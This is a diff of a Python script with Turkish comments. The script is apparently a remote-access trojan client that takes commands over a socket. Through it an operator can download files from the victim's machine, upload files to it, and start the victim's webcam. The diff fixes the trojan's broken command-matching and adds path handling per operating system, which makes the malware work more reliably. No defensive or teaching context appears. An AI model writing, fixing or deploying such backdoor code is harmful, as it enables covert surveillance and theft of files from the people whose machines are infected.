@@ -47,10 +47,13 @@ while True:
         else:
             # eğer başarılı olursa, boş mesaj gönder
             output = ""
-    if splited_command[0].lower() == "indir" or "download":
+    if splited_command[0].lower() in ["indir","download"]:
         dosya_ismi = baglanti.recv(BUFFER).decode() # istenilen dosyanın adını aldık
         
-        file = open(dosya_ismi, "rb") # dosyayı açtık
+        if pl == "Windows":
+            file = open(dosya_ismi, "rb") # dosyayı açtık
+        else:
+            file = open(cwd+"/"+dosya_ismi, "rb")
         
         data = file.read() # veriyi okuduk
         baglanti.send(data) # dosyayı gönderdik
@@ -68,10 +71,13 @@ while True:
         baglanti.send(cwd.encode())
         continue
         
-    if command.lower() == "gonder" or "upload":
+    if splited_command[0].lower() in ["gonder","upload"]:
         dosya_ismi = baglanti.recv(BUFFER).decode() # gelecek dosyanın adını aldık
         
-        file = open(dosya_ismi, "wb") # dosyayı oluşturduk
+        if pl == "Windows":
+            file = open(dosya_ismi, "wb") # dosyayı oluşturduk
+        else:
+            file = open(cwd+"/"+dosya_ismi, "wb")
         
         while True:
             data = baglanti.recv(1024)
@@ -91,7 +97,7 @@ while True:
             file.write(data)
         continue
     
-    if command.lower() == "webcam_izle" or "webcam_start":
+    if command.lower() in ["webcam_izle","webcam_start"]:
         while True:
             vid = cv2.VideoCapture(0)
             while(vid.isOpened()):
